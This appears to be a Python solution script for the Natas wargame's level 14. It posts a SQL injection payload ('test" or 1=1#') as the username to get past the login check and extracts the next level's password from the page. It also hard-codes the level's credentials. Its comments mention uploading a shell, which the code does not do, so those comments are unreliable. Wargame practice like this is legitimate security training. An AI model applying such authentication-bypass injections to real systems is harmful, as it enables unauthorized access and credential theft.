import requests
import re
import binascii
import base64

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

#we upload our shell
response = session.post(url, data= {"username" : 'test" or 1=1#', "password": " "}, auth = (username, password))

# we get the response bla bla bla upload succesfull etc
content = response.text

print(re.findall('natas15 is (.*)<br>', content)[0])

